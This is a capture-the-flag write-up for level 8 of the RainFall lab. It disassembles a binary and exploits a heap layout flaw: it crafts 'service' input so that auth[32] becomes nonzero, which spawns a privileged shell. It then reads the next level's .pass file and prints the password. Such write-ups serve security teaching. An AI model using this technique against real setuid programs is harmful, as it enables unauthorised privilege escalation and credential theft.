# Level 8

Once logged in, you will see a binary `level8`.

```
$ ssh localhost -p 4444 -l level8
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level8@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
level8@RainFall:~$
```


Let's run this and see what this does.

```
level8@RainFall:~$ ls
level8
level8@RainFall:~$ ./level8
(nil), (nil)
aaaaaaaaaaaaaaaaaaaaa
(nil), (nil)
```

Okay, seems little differnt from past levels. By taking a look at the binary, there is only a `main` function.

```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
[...]
0x08048564  main
[...]
```

There are two global variables `auth`, and `service`, which might be a hint to the solution.

```
gdb-peda$ info variables
All defined variables:

Non-debugging symbols:
[...]
0x08049aac  auth
0x08049ab0  service
```

Let's take a look at the main function.

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp
   0x08048567 <+3>:	push   edi
   0x08048568 <+4>:	push   esi
   0x08048569 <+5>:	and    esp,0xfffffff0
   0x0804856c <+8>:	sub    esp,0xa0
   0x08048572 <+14>:	jmp    0x8048575 <main+17>
   0x08048574 <+16>:	nop
   0x08048575 <+17>:	mov    ecx,DWORD PTR ds:0x8049ab0
   0x0804857b <+23>:	mov    edx,DWORD PTR ds:0x8049aac
   0x08048581 <+29>:	mov    eax,0x8048810
   0x08048586 <+34>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804858a <+38>:	mov    DWORD PTR [esp+0x4],edx
   0x0804858e <+42>:	mov    DWORD PTR [esp],eax
   0x08048591 <+45>:	call   0x8048410 <printf@plt>
   0x08048596 <+50>:	mov    eax,ds:0x8049a80
   0x0804859b <+55>:	mov    DWORD PTR [esp+0x8],eax
   0x0804859f <+59>:	mov    DWORD PTR [esp+0x4],0x80
   0x080485a7 <+67>:	lea    eax,[esp+0x20]
   0x080485ab <+71>:	mov    DWORD PTR [esp],eax
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>
   0x080485b3 <+79>:	test   eax,eax
   0x080485b5 <+81>:	je     0x804872c <main+456>
   0x080485bb <+87>:	lea    eax,[esp+0x20]
   0x080485bf <+91>:	mov    edx,eax
   0x080485c1 <+93>:	mov    eax,0x8048819
   0x080485c6 <+98>:	mov    ecx,0x5
   0x080485cb <+103>:	mov    esi,edx
   0x080485cd <+105>:	mov    edi,eax
   0x080485cf <+107>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080485d1 <+109>:	seta   dl
   0x080485d4 <+112>:	setb   al
   0x080485d7 <+115>:	mov    ecx,edx
   0x080485d9 <+117>:	sub    cl,al
   0x080485db <+119>:	mov    eax,ecx
   0x080485dd <+121>:	movsx  eax,al
   0x080485e0 <+124>:	test   eax,eax
   0x080485e2 <+126>:	jne    0x8048642 <main+222>
   0x080485e4 <+128>:	mov    DWORD PTR [esp],0x4
   0x080485eb <+135>:	call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:	mov    ds:0x8049aac,eax
   0x080485f5 <+145>:	mov    eax,ds:0x8049aac
   0x080485fa <+150>:	mov    DWORD PTR [eax],0x0
   0x08048600 <+156>:	lea    eax,[esp+0x20]
   0x08048604 <+160>:	add    eax,0x5
   0x08048607 <+163>:	mov    DWORD PTR [esp+0x1c],0xffffffff
   0x0804860f <+171>:	mov    edx,eax
   0x08048611 <+173>:	mov    eax,0x0
   0x08048616 <+178>:	mov    ecx,DWORD PTR [esp+0x1c]
   0x0804861a <+182>:	mov    edi,edx
   0x0804861c <+184>:	repnz scas al,BYTE PTR es:[edi]
   0x0804861e <+186>:	mov    eax,ecx
   0x08048620 <+188>:	not    eax
   0x08048622 <+190>:	sub    eax,0x1
   0x08048625 <+193>:	cmp    eax,0x1e
   0x08048628 <+196>:	ja     0x8048642 <main+222>
   0x0804862a <+198>:	lea    eax,[esp+0x20]
   0x0804862e <+202>:	lea    edx,[eax+0x5]
   0x08048631 <+205>:	mov    eax,ds:0x8049aac
   0x08048636 <+210>:	mov    DWORD PTR [esp+0x4],edx
   0x0804863a <+214>:	mov    DWORD PTR [esp],eax
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:	lea    eax,[esp+0x20]
   0x08048646 <+226>:	mov    edx,eax
   0x08048648 <+228>:	mov    eax,0x804881f
   0x0804864d <+233>:	mov    ecx,0x5
   0x08048652 <+238>:	mov    esi,edx
   0x08048654 <+240>:	mov    edi,eax
   0x08048656 <+242>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048658 <+244>:	seta   dl
   0x0804865b <+247>:	setb   al
   0x0804865e <+250>:	mov    ecx,edx
   0x08048660 <+252>:	sub    cl,al
   0x08048662 <+254>:	mov    eax,ecx
   0x08048664 <+256>:	movsx  eax,al
   0x08048667 <+259>:	test   eax,eax
   0x08048669 <+261>:	jne    0x8048678 <main+276>
   0x0804866b <+263>:	mov    eax,ds:0x8049aac
   0x08048670 <+268>:	mov    DWORD PTR [esp],eax
   0x08048673 <+271>:	call   0x8048420 <free@plt>
   0x08048678 <+276>:	lea    eax,[esp+0x20]
   0x0804867c <+280>:	mov    edx,eax
   0x0804867e <+282>:	mov    eax,0x8048825
   0x08048683 <+287>:	mov    ecx,0x6
   0x08048688 <+292>:	mov    esi,edx
   0x0804868a <+294>:	mov    edi,eax
   0x0804868c <+296>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804868e <+298>:	seta   dl
   0x08048691 <+301>:	setb   al
   0x08048694 <+304>:	mov    ecx,edx
   0x08048696 <+306>:	sub    cl,al
   0x08048698 <+308>:	mov    eax,ecx
   0x0804869a <+310>:	movsx  eax,al
   0x0804869d <+313>:	test   eax,eax
   0x0804869f <+315>:	jne    0x80486b5 <main+337>
   0x080486a1 <+317>:	lea    eax,[esp+0x20]
   0x080486a5 <+321>:	add    eax,0x7
   0x080486a8 <+324>:	mov    DWORD PTR [esp],eax
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:	mov    ds:0x8049ab0,eax
   0x080486b5 <+337>:	lea    eax,[esp+0x20]
   0x080486b9 <+341>:	mov    edx,eax
   0x080486bb <+343>:	mov    eax,0x804882d
   0x080486c0 <+348>:	mov    ecx,0x5
   0x080486c5 <+353>:	mov    esi,edx
   0x080486c7 <+355>:	mov    edi,eax
   0x080486c9 <+357>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080486cb <+359>:	seta   dl
   0x080486ce <+362>:	setb   al
   0x080486d1 <+365>:	mov    ecx,edx
   0x080486d3 <+367>:	sub    cl,al
   0x080486d5 <+369>:	mov    eax,ecx
   0x080486d7 <+371>:	movsx  eax,al
   0x080486da <+374>:	test   eax,eax
   0x080486dc <+376>:	jne    0x8048574 <main+16>
   0x080486e2 <+382>:	mov    eax,ds:0x8049aac
   0x080486e7 <+387>:	mov    eax,DWORD PTR [eax+0x20]
   0x080486ea <+390>:	test   eax,eax
   0x080486ec <+392>:	je     0x80486ff <main+411>
   0x080486ee <+394>:	mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
   0x080486fa <+406>:	jmp    0x8048574 <main+16>
   0x080486ff <+411>:	mov    eax,ds:0x8049aa0
   0x08048704 <+416>:	mov    edx,eax
   0x08048706 <+418>:	mov    eax,0x804883b
   0x0804870b <+423>:	mov    DWORD PTR [esp+0xc],edx
   0x0804870f <+427>:	mov    DWORD PTR [esp+0x8],0xa
   0x08048717 <+435>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804871f <+443>:	mov    DWORD PTR [esp],eax
   0x08048722 <+446>:	call   0x8048450 <fwrite@plt>
   0x08048727 <+451>:	jmp    0x8048574 <main+16>
   0x0804872c <+456>:	nop
   0x0804872d <+457>:	mov    eax,0x0
   0x08048732 <+462>:	lea    esp,[ebp-0x8]
   0x08048735 <+465>:	pop    esi
   0x08048736 <+466>:	pop    edi
   0x08048737 <+467>:	pop    ebp
   0x08048738 <+468>:	ret
End of assembler dump.
```

It is a huge assembly code, but once decompiling them, the program functions as follows:
1. It first prints the address of auth and service, and prints while looping.
2. Gets input from the user
3. Checks first input if it' a string that matches `"auth "` (5 chars including space). If true, it copies over the string after `"auth "` to a `malloc`ed string of size 4. (Max string length after `"auth "` is 30 bytes.)
4. If the input is `"reset"`, it frees the global variable `auth`.
5. If the input is `"service"`, it duplicates `buffer` starting after the first 7 chars into the globial variable `service`.
6. if the input is `"login"`, there is another conditional statement within:
	1. If `auth[32]` is not `NULL`, it executes `system("/bin/sh")`
	2. Else, it prints `"Password:\n"` to stdout.


Let's run the program and see how it works.

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
login
Password:
0x804a008, (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
```

By giving an input of service after putting the auth, we can see the address of the service, and they are very close. With `malloc`, each pointer is placed right after the prev ones with some padding in between.

So, to solve the problem, in other words, to get `auth[32]` value set to not zero, we just need to get `auth[32]` to land within the `service` string.

```
The memory: auth            service123456789012345a
						^               ^                     ^
						0x804a008       0x804a018             auth[32]
```

The exploit in action:

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service123456789012345a // <- a on 16th padding
0x804a008, 0x804a018    // NOTE: 32 chars after 0x804a008 is within 0x804a018 if that is more than 16 chars long
login
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
